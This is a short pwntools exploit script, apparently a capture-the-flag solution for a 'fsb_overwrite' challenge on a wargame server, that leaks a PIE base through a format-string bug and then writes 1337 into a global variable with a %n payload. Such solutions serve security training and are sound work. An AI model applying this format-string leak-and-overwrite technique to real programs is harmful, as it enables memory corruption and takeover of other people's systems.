from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/fsb_overwrite')
else:
    r = remote('host1.dreamhack.games', 16977)

__libc_csu_init_offset = 0x940  # offset of __libc_csu_init() from PIE base
changeme_offset = 0x20101c  # offset of changeme from PIE base


# leak PIE

if REMOTE:
    r.send('%8$p')
else:
    r.send('%7$p')

__libc_csu_init = int(r.recvline()[2:-1], 16)  # __libc_csu_init()
pie = __libc_csu_init - __libc_csu_init_offset  # PIE base
changeme = pie + changeme_offset  # global var <changeme>


# overwrite changeme with 1337

payload = b'%1337c%8$n'.ljust(0x10, b'a')
payload += p64(changeme)

r.send(payload)


r.interactive()